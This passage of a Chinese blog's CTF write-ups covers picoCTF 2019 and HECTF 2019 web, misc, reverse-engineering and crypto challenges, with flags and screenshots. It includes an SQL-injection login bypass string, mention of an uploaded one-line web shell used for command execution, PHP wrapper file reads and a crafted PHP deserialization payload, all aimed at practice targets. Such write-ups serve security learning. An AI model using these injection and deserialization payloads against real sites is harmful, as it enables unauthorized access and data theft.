<p>This website can be rendered only by picobrowser, go and catch the flag! <a href="https://2019shell1.picoctf.com/problem/37829/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37829/</a> (link) or <a href="http://2019shell1.picoctf.com:37829" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37829</a></p>
</blockquote>
<blockquote>
<p>Hints: You dont need to download a new web browser</p>
</blockquote>
<figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>伪造一下UA头  picoCTF{p1c0_s3cr3t_ag3nt_7e9c671a}</p>
<h2 id="Irish-Name-Repo-1-Points-300"><a href="#Irish-Name-Repo-1-Points-300" class="headerlink" title="Irish-Name-Repo 1 - Points: 300"></a>Irish-Name-Repo 1 - Points: 300</h2><blockquote>
<p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/32241/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/32241/</a> (link) or <a href="http://2019shell1.picoctf.com:32241" target="_blank" rel="noopener">http://2019shell1.picoctf.com:32241</a>. Do you think you can log us in? Try to see if you can login!</p>
</blockquote>
<blockquote>
<p>Hints: There doesn’t seem to be many ways to interact with this, I wonder if the users are kept in a database?<br>  Try to think about how does the website verify your login?</p>
</blockquote>
<p>用万能密码  admin’ or ‘1’=’1  直接可以登陆</p>
<figure class="image-box">
                <img src="./29.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>picoCTF{s0m3_SQL_0397f20c}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019HECTF wp]]></title>
      <url>/ctf-writeup/ckwd5ws5g0002d0uc3rnh2e9d/</url>
      <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Code-execution"><a href="#Code-execution" class="headerlink" title="Code execution"></a>Code execution</h2><p>首页是一个shell.php，访问</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>cmd不能执行phpinfo，而php_cmd却可以</p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>在upload页面上一句话，在根目录下发现flag.txt，但是没有权限访问</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>所以就利用cmd_php来执行命令，这里用反引号执行</p>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="我只会ping吗"><a href="#我只会ping吗" class="headerlink" title="我只会ping吗"></a><strong>我只会</strong>ping<strong>吗</strong></h2><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="file在哪里"><a href="#file在哪里" class="headerlink" title="file在哪里"></a><strong>file在哪里</strong></h2><p><strong>php伪协议读hint.php</strong></p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>base64解码得到</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>然后spam+栅栏密码解密<a href="http://www.spammimic.com/decode.cgi" target="_blank" rel="noopener">http://www.spammimic.com/decode.cgi</a></p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="Romance签到"><a href="#Romance签到" class="headerlink" title="Romance签到"></a><strong>Romance签到</strong></h2><figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>访问得到hint.php</p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></p>
<p>在线解密flag{1ac59eab-7240-446e-b52b-a795e102966a}</p>
<h2 id="金闪闪的小饼干"><a href="#金闪闪的小饼干" class="headerlink" title="金闪闪的小饼干"></a><strong>金闪闪的小饼干</strong></h2><p>题目提示金闪闪的小饼干，抓包查看cookie</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>base64解码值就是flag</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="缘分"><a href="#缘分" class="headerlink" title="缘分"></a>缘分</h2><p>根据题目提示“相恨见晚”，说明Hint中的特定时间是指晚上</p>
<p>在晚上的时候，在登陆界面随便输入，出现Warning</p>
<p>根据warning里的内容，flag中输入adimn，name输入admin123，提交以后得到flag</p>
<h2 id="你看这个php它又大又圆"><a href="#你看这个php它又大又圆" class="headerlink" title="你看这个php它又大又圆"></a>你看这个php它又大又圆</h2><figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>根据代码一步一步来，user需要等于admin</p>
<p>可以使用php伪协议来完成。</p>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>然后构造pass使用数组绕过即可</p>
<p>然后file使用伪协议读取即可</p>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>base64解密即可</p>
<p>DQo8P3BocA0KDQplcnJvcl9yZXBvcnRpbmcoRV9BTEwgJiB+RV9OT1RJQ0UpOw0KDQovL2ZsYWd7SGU2VHVDVEZAOkYxYTkxc3RIMXN9DQoNCj8+DQo=</p>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="让我们来一起变魔术吧"><a href="#让我们来一起变魔术吧" class="headerlink" title="让我们来一起变魔术吧"></a>让我们来一起变魔术吧</h2><p>F12首先看到源码</p>
<figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>可以看出是反序列化函数，首先收集函数，然后构造攻击链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.__get()：读取不可访问属性的值时，__get() 会被调用</span><br><span class="line">2.__toString()：是在直接输出对象引用时自动调用的</span><br><span class="line">3.__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line">__toString()作为最好触发应该为攻击链突破口，然后在Test中寻找到return $func(),看来是调用__invoke()的缺口，然后就是__get()的调用了，在__toString()中看到str[&apos;str&apos;]-&gt;soure可以看出能够调用非Show类的函数，从而触发__get().</span><br><span class="line">4.现在还有一个token==token_flag这里我们可以使用php引用漏洞</span><br><span class="line">$a = 1 </span><br><span class="line">$b = &amp;$a</span><br><span class="line">$a = $a +1</span><br><span class="line">即可得$b =2</span><br><span class="line">5.攻击链</span><br><span class="line">Show()-&gt;__toString-&gt;Test()-&gt;__get-&gt;Read()-&gt;__invoke</span><br></pre></td></tr></table></figure></p>
<p>构造反序列化需要反攻击链<br>代码为</p>
<figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>构造序列化为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：O:4:<span class="string">"Show"</span>:2:&#123;s:6:<span class="string">"source"</span>;O:4:<span class="string">"Show"</span>:2:&#123;s:6:<span class="string">"source"</span>;N;s:3:<span class="string">"str"</span>;a:1:&#123;s:3:<span class="string">"str"</span>;O:4:<span class="string">"Test"</span>:1:&#123;s:6:<span class="string">"params"</span>;O:4:<span class="string">"Read"</span>:3:&#123;s:3:<span class="string">"var"</span>;N;s:5:<span class="string">"token"</span>;N;s:10:<span class="string">"token_flag"</span>;R:8;&#125;&#125;&#125;&#125;s:3:<span class="string">"str"</span>;N;&#125;</span><br></pre></td></tr></table></figure></p>
<p>flag{224761e8-fb8c-460d-bc65-a151470d7085}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="问卷题目"><a href="#问卷题目" class="headerlink" title="问卷题目"></a>问卷题目</h2><p> 提交问卷就给flag</p>
<h2 id="哪吒？！"><a href="#哪吒？！" class="headerlink" title="哪吒？！"></a>哪吒？！</h2><p>拖进winhex尾部看到pk头,foremost分离得到加密zip</p>
<p>拖进winhex发现是伪加密,破解得到flag</p>
<p>HEBTUCTF{Y0u_f0und_me!}</p>
<h2 id="这是一个极其简单的签到题"><a href="#这是一个极其简单的签到题" class="headerlink" title="这是一个极其简单的签到题"></a>这是一个极其简单的签到题</h2><p>下载后得到一个分辨率为3x500的jpeg图片.</p>
<p>在Kali使用binwalk发现该图为gif格式.</p>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>更改格式后发现图内不断闪过字母(应该是flag),因为图片分辨率太小,很难观察到图内的全部内容，所以先进行gif的分帧并将所有帧拼接。</p>
<figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>大功告成,得到Flag.</p>
<h2 id="印证血统的时候到了"><a href="#印证血统的时候到了" class="headerlink" title="印证血统的时候到了"></a>印证血统的时候到了</h2><p>在drawing.js下有aaencode加密,找在线网站解密</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    alert(<span class="string">"wait a minute"</span>);</span><br><span class="line">    alert(<span class="string">"Wait."</span>);</span><br><span class="line">    alert(<span class="string">"Wait.."</span>);</span><br><span class="line">    alert(<span class="string">"Wait..."</span>);</span><br><span class="line">    alert(<span class="string">"flag 在来的路上出了点问题"</span>);</span><br><span class="line">    <span class="keyword">var</span> flag=<span class="string">"诶呀呀 你看着可爱的小表情     ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀sojson.com*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ])(ﾟΘﾟ))((ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ)+(ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]);"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>百度搜索<br>密码flag{f25a7a4b-6eae-43c5-bbe9-b76aa74c8368}</p>
<h2 id="咕咕咕果"><a href="#咕咕咕果" class="headerlink" title="咕咕咕果"></a>咕咕咕果</h2><figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>通过魔法上网,访问<a href="https://www.google.com/flag.txt" target="_blank" rel="noopener">https://www.google.com/flag.txt</a>，</p>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>最后得到Flag.</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="qiandao"><a href="#qiandao" class="headerlink" title="qiandao"></a>qiandao</h2><p>1.</p>
<figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>2.</p>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="helloRE"><a href="#helloRE" class="headerlink" title="helloRE"></a>helloRE</h2><p>1.</p>
<figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>2.</p>
<figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>3.</p>
<figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>4.</p>
<figure class="image-box">
                <img src="./29.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>5.</p>
<figure class="image-box">
                <img src="./30.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>6.</p>
<figure class="image-box">
                <img src="./31.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>7.</p>
<figure class="image-box">
                <img src="./32.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>8.</p>
<figure class="image-box">
                <img src="./33.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>9.</p>
<figure class="image-box">
                <img src="./34.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>10.</p>
<figure class="image-box">
                <img src="./35.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>11.</p>
<figure class="image-box">
                <img src="./36.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>12.</p>
<figure class="image-box">
                <img src="./37.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>13.</p>
<p>这就是最终的脚本了。</p>
<figure class="image-box">
                <img src="./38.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>14.</p>
<figure class="image-box">
                <img src="./39.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>15.</p>
<figure class="image-box">
                <img src="./40.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>16.</p>
<figure class="image-box">
                <img src="./41.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="鼠鼠"><a href="#鼠鼠" class="headerlink" title="## 鼠鼠"></a>## 鼠鼠</h2><p>第一段flag在提取的ole的vba代码里</p>
<figure class="image-box">
                <img src="./42.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>第二段flag需要异或得到</p>
<figure class="image-box">
                <img src="./43.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>第三段flag在老鼠后面</p>
<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><figure class="image-box">
                <img src="./44.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>包裹上题目的flag格式提交</p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="妈妈我想玩Base64"><a href="#妈妈我想玩Base64" class="headerlink" title="妈妈我想玩Base64"></a>妈妈我想玩Base64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">Str=str(base64.b64decode(f.read()),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="string">'''while Str not in 'flag':</span></span><br><span class="line"><span class="string">    Str=str(base64.b64decode(Str),encoding='utf-8')</span></span><br><span class="line"><span class="string">    print(str(i)+'\n')</span></span><br><span class="line"><span class="string">    i=i+1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">    Str=str(base64.b64decode(Str),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    print(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">print(Str)</span><br><span class="line">print(<span class="string">"GG"</span>)</span><br></pre></td></tr></table></figure>
<p>通过while循环发现base64解密后50次报错 ，用for循环49次，<br>flag{c03781ba-81e9-48a6-afa4-037ee75c8428}</p>
<p>GG</p>
<h2 id="SCP-log"><a href="#SCP-log" class="headerlink" title="SCP_log"></a>SCP_log</h2><p>下载好文档打开后里面有几串字母和数字的等式。</p>
<figure class="image-box">
                <img src="./45.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>经搜索得知是RSA加密，而且这道题恰好给出了RSA加密几个关键的数值.(素数对的乘积n,以及指数e) 这里要弄懂以下函数表达的意义↓.</p>
<figure class="image-box">
                <img src="./46.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p> 故开始进行解题.</p>
<p>1.对n进行分解</p>
<p>选择<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a>对n分解,查看是否储存有已经分解成功的N值.</p>
<figure class="image-box">
                <img src="./47.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./48.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>成功将n值分解为p和q.</p>
<p>2.计算d值.</p>
<p>因为得到的p,q,e数值较大.所以从网上找到脚本计算d值.</p>
<figure class="image-box">
                <img src="./49.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>得到两个d值分别为221840096952962289314707891263857576041和33580702939028137216163981439176632233038140452498081226430421384805976218945</p>
<p>3.最后用算出的d与网上的脚本将密文c进行解密.</p>
<figure class="image-box">
                <img src="./50.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./51.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>4.将明文进行组合,得到flag为flag{1721f85a-85ed-4769-8faa-4e15baaaa853}</p>
<h2 id="啥玩意啊"><a href="#啥玩意啊" class="headerlink" title="啥玩意啊"></a>啥玩意啊</h2><p>题目描述为: flag由3部分组成:hebctf{flag1-flag2-flag3}</p>
<p>1.flag1由5个字符组成，sha1加密后：8af093ec12abbd25a82abd6d5ed8080afbbfa098</p>
<p>前3个字符为：odm 第4个字符是个小写字符，最后一个是个数字。</p>
<p> 解:根据描述知flag1前三位是odm, 经过 猜测 第四位小写字母为s，最后一个数字为1，因此猜测flag1为odms1，经过sha1加密后与描述匹配，确认flag1无误。(真的是猜出来的..)</p>
<p>2.flag2:playfair加密(有意义的单词)     密文为 kb ky hs   密钥为 flag1去掉数字。</p>
<p> 解: 通过flag1将密钥补全并填充字母写成5x5矩形.</p>
<figure class="image-box">
                <img src="./52.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>3.仿射加密 </p>
<p>key1:它是第3个合格的仿射加密key1(那仿射密码对key1有什么要求？)</p>
<p>key2:凯撒密码向后移几位它就是几</p>
<p>密文：srpnv </p>
<p>解: 仿射密码是将26个字母换成数字,并进行对应数学运算进行加密的加密方式. </p>
<pre><code>key1讲是第三个合格的仿射加密,即为第三个与26互素的数字,故key1为5 。

key2是凯撒密码向后移动的位数, 通常凯撒密码移动的位数为3,故key2为3。

则我们可以根据解密函数 {% image https://uploader.shimo.im/f/qQ4UiWl4xMsZGHnH.png!thumbnail '图片' '' %}

构建对应表格。
</code></pre><figure class="image-box">
                <img src="./53.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>[注释:key1为a的数值，key2为b的数值，m为英文字母总数26，</p>
<p>a^(-1)应满足<figure class="image-box">
                <img src="./54.png" alt="图片" title class>
                <p>图片</p>
            </figure>，故带入5求得对应数值为21]</p>
<p>故flag3为disco</p>
<p>将3个flag合并得到最终答案 hebctf{odms1-helxlo-disco} ,这里应注意,提交答案时应将helxlo中的x去掉,才是正确答案。</p>
<h2 id="书页要分栏"><a href="#书页要分栏" class="headerlink" title="书页要分栏"></a>书页要分栏</h2><p>小兰听说要给书页分栏，可是明明这本书只有5页欸！</p>
<p>解:</p>
<p>将栅栏密码密文 SWDY=zdEAFwVRWlD3RnVUfcFSVDVMTJCyM0VUfNESBl= 解密5次</p>
<p>得到Base64加密密文 SEVCVFVDVEYlN0JDcnlwdDBfMTVfRWFzWSUyMSU3RA==</p>
<p>解密得到 HEBTUCTF%7BCrypt0_15_EasY%21%7D </p>
